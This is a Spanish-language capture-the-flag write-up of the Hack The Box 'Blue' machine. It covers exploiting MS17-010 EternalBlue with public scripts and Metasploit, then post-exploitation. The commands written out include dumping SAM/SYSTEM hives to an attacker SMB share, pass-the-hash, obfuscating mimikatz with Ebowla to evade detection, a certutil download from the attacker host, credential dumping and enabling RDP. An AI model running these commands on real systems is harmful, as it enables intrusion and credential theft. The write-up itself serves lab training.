---
title: <span style="color:green">HTB:</span> Blue
date: 2023-09-13 14:10:00 +0800
author: pablo
categories: [HTB, Windows]
tags: [ms17-010, metasploit, eternalBlue] # TAG names should always be lowercase
image:
  path: /assets/img/Blue/BluePortada.png
---

## Descripción

Esta maquina explotara la vulnerabilidad **MS17-010 a través del exploit de Eternal Blue, la explotación se hará tanto de manera manual como automática a través de Metasploit.**

EternalBlue es una vulnerabilidad informática que afecta a sistemas Windows, utilizada en el ataque de ransomware WannaCry en 2017. Creada originalmente por la Agencia de Seguridad Nacional de los Estados Unidos (NSA), esta vulnerabilidad fue filtrada públicamente por el grupo de hackers The Shadow Brokers. Permitió a los hackers ejecutar código malicioso de forma remota en sistemas no actualizados, resaltando la importancia de mantener actualizados los sistemas operativos y aplicar parches de seguridad. Su impacto demostró la necesidad crítica de la seguridad cibernética en el mundo digital actual.

---

## Reconocimiento

Se comprueba que la máquina está activa y se determina su sistema operativo a través del script implementado en bash `whichSystem.sh`

![Untitled](/assets/img/Blue/Untitled1.png)

El sistema operativo es una `Windows`

### Nmap

Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap.
Comando: `sudo nmap -p- --open -sS -T4 -vvv -n -Pn 192.168.1.20 -oG allPorts`

![Untitled](/assets/img/Blue/Untitled2.png)

Puertos abiertos son: `135,139,445,49152,49153,49154,49155,49156,49157`

Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados.

Comando: `nmap -sCV -p80,3306,33060 192.168.1.20 -oN targeted`

Obteniendo:

![Untitled](/assets/img/Blue/Untitled3.png)

Donde se visualiza que el puerto `445` correspondientes al protocolo `SMB` está abierto y corresponde a un `Windows 7`, muy posiblemente vulnerable.

Se procede a escanear este puerto atreves de scripts de vulnerabilidades SMB.

![Untitled](/assets/img/Blue/Untitled4.png)

Se obtiene que es vulnerable para la vulnerabilidad ms17-010 que se puede explotar a través del Eternal Blue.

## Explotación

### Manual AutoBlue

Se realizará de forma manual a través de un script de github: [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

Se clona el repositorio y lo primero será comprobar que es el vulnerable a través del script: `eternal_checker.py`

![Untitled](/assets/img/Blue/Untitled5.png)

Nos dirigimos a la carpeta shellcode, para crear el <`shellcode_file`> que es necesario para el script de `eternalblue_exploit7.py`.

Ejecutamos el script y debemos ingresar la IP Atacante y el Puerto donde queremos recibir la reverse shell, en mi caso el puerto 80

![Untitled](/assets/img/Blue/Untitled6.png)

Volvemos a la carpeta principal del `AutoBlue` y procedemos a realizar la explotación, brindado la IP víctima y el `sc_x64.bin` que acabamos de crear en el paso anterior. En otra ventana estaremos en escucha en el puerto 80 a través de Netcat que es el que recibirá la revershell.

![Untitled](/assets/img/Blue/Untitled7.png)

Obtención de la reverse shell

![Untitled](/assets/img/Blue/Untitled8.png)

Se procede a comprobar la shell obtenida:

![Untitled](/assets/img/Blue/Untitled9.png)

Nos encontramos en la máquina víctima con privilegios root.

Enumeramos las flags, dirigiéndonos a la ruta `\Users` y a través del comando:

`dir /s user.txt`

![Untitled](/assets/img/Blue/Untitled10.png)

### Manual Worawit

Utilizando [https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)

Primero utilizar el archivo `checker.py`

![Untitled](/assets/img/Blue/Untitled11.png)

En acaso de obtener un `STATUS_ACCESS_DENIED` es necesario editar el `checker.py` y colocar un usuario `guest`

![Untitled](/assets/img/Blue/Untitled12.png)

Corriendo nuevamente el `checker.py`

![Untitled](/assets/img/Blue/Untitled13.png)

Editando el archivo `zzz_exploit.py`

Comentando las siguientes lineas

![Untitled](/assets/img/Blue/Untitled14.png)

Des comentando la línea `982` y editándola como sigue:

![Untitled](/assets/img/Blue/Untitled15.png)

En nuestra máquina atacante, utilizaremos **`impacket-server`** para compartir una carpeta que contendrá el binario de **`nc`**. Con el comando previamente editado, lograremos que la máquina víctima nos envíe una consola a nuestra máquina atacante.
Utilizando [https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)

![Untitled](/assets/img/Blue/Untitled16.png)

El binario que debemos transferir a nuestra máquina víctima es el `nc64.exe`

Copiando el binario al directorio actual de trabajo y renombrándolo

![Untitled](/assets/img/Blue/Untitled17.png)

Crear un recurso compartido a través de `impacket-server` y poniéndonos en escucha a través de `nc` y ejecutando el exploit `zzz.py` con `python2.7` pasándole el nombre de un `named pipes`

![Untitled](/assets/img/Blue/Untitled18.png)

Obteniendo:

![Untitled](/assets/img/Blue/Untitled19.png)

## Técnicas de persistencia

### Obtener hashes usuarios del sistema

Obteniendo una copia de los archivos `system` y `sam`

```bash
reg save HKLM\system system.backup
reg save HKLM\sam sam.backup
```

Obteniendo:

![Untitled](/assets/img/Blue/Untitled20.png)

Transfiriendo estos archivos a nuestra máquina atacante a través de `impacket-server`

```bash
#Copiar Windows -> Linux
copy sam.backup \\10.10.14.13\smbFolder\sam
copy system.backup \\10.10.14.13\smbFolder\system
```

![Untitled](/assets/img/Blue/Untitled21.png)

Obteniendo:

![Untitled](/assets/img/Blue/Untitled22.png)

Utilizando `impacket-secretsdump` vamos a obtener los hashes:

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

Obteniendo:

![Untitled](/assets/img/Blue/Untitled23.png)

Estos hashes nos servirían para realizar **Pass the hash**

### **Pass the hash**

Una vez encontrando los hashes de los usuarios se van a validar a través de `nxc`

```bash
nxc smb 10.10.10.40 -u 'Administrator' -H 'cdf51b162460b7d5bc898f493751a0cc'
```

![Untitled](/assets/img/Blue/Untitled24.png)

Dumpear LSA

```bash
nxc smb 10.10.10.40 -u 'Administrator' -H 'cdf51b162460b7d5bc898f493751a0cc' --lsa
```

![Untitled](/assets/img/Blue/Untitled25.png)

Conectarnos a la máquina víctima a través de `impacket-psexec`

```bash
impacket-psexec WORKGROUP/Administrator@10.10.10.40 -hashes :cdf51b162460b7d5bc898f493751a0cc
```

![Untitled](/assets/img/Blue/Untitled26.png)

### Subir `mimikatz.exe` - `ebowla` manual

Localizar el binario de `mimikatz.exe`

![Untitled](/assets/img/Blue/Untitled27.png)

### Ebowla

Se va a utilizar ebowla para ofuscar el código del binario de mimikatz

Utilizando [https://github.com/Genetic-Malware/Ebowla](https://github.com/Genetic-Malware/Ebowla)

Moviendo el binario `mimikatz.exe` al directorio de Ebowla

![Untitled](/assets/img/Blue/Untitled28.png)

Editando el archivo `genetic.config`

Editando las variables:

```bash
output_type = GO

payload_tpye = EXE
```

![Untitled](/assets/img/Blue/Untitled29.png)

![Untitled](/assets/img/Blue/Untitled30.png)

Editando las variables de entorno:

![Untitled](/assets/img/Blue/Untitled31.png)

Obteniendo el valor de las variables de entorno desde la máquina Windows:

![Untitled](/assets/img/Blue/Untitled32.png)

![Untitled](/assets/img/Blue/Untitled33.png)

Ejecutamos el ebowla

```bash
python2 ebowla.py mimikatz.exe genetic.config
```

![Untitled](/assets/img/Blue/Untitled34.png)

Esto habrá creado un script en `go` con el cual crearemos un compilado final

Creando binario final

```bash
./build_x64_go.sh output/go_symmetric_mimikatz.exe.go final_mimi.exe
```

![Untitled](/assets/img/Blue/Untitled35.png)

Obteniendo:

![Untitled](/assets/img/Blue/Untitled36.png)

Renombrando el archivo a `tensada.exe`
En nuestra máquina atacante levantamos un servidor con Python para trasnferir el binario

Transfiriendo el archivo a la máquina víctima a través de `certutil.exe`

```bash
certutil.exe -f -urlcache -split http://10.10.14.13/tensada.exe
```

![Untitled](/assets/img/Blue/Untitled37.png)

Ejecutando:

![Untitled](/assets/img/Blue/Untitled38.png)

### Mimikatz

Realizando:

```bash
privilege::debug
```

![Untitled](/assets/img/Blue/Untitled39.png)

Haciendo

```bash
sekurlsa::logonPasswords
```

![Untitled](/assets/img/Blue/Untitled40.png)

```bash
* Username : Administrator
* Domain   : haris-PC
* Password : ejfnIWWDojfWEKM
```

Validando credencial

![Untitled](/assets/img/Blue/Untitled41.png)

### Habilitar RDP - escritorio remoto

Se procede a verificar si el puerto 3389 se encuentra abierto y se comprueba que está cerrado a través de `nxc` lo habilitaremos

![Untitled](/assets/img/Blue/Untitled42.png)

```bash
nxc smb 10.10.10.40 -u 'Administrator' -p 'ejfnIWWDojfWEKM' -M rdp -o action=enable
```

Habilitar RDP desde el cmd

```bash
# Enable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

![Untitled](/assets/img/Blue/Untitled43.png)

Verificando a traves de nmap

![Untitled](/assets/img/Blue/Untitled44.png)

### Conectar escritorio remoto

```bash
rdesktop 10.10.10.40 -u 'Administrator' -p 'ejfnIWWDojfWEKM'
```

Obteniendo:

![Untitled](/assets/img/Blue/Untitled45.png)

## Metasploit

Ejecutamos metasploit en modo silencioso

![Untitled](/assets/img/Blue/Untitled46.png)

Buscamos por `MS17-010`

![Untitled](/assets/img/Blue/Untitled47.png)

Se observa que hay varios exploits y un scanner, primeramente ocuparemos el scanner para corroborar que es vulnerable.

Configuramos la IP objetiva

![Untitled](/assets/img/Blue/Untitled48.png)

Corremos el exploit y se verifica que es vulnerable

![Untitled](/assets/img/Blue/Untitled49.png)

Ahora estaremos ocupando el exploit: `exploit/windows/smb/ms17_010_eternalblue`

Configuramos la IP objetiva y nuestra IP atacante, en este ejemplo se estará trabajando con una consola meterpreter, en caso de querer otra la podemos cambiar en la opción de “Payload”

![Untitled](/assets/img/Blue/Untitled50.png)

Ejecutamos el exploit

Habremos ganado una consola meterpreter con privilegios de root

![Untitled](/assets/img/Blue/Untitled51.png)
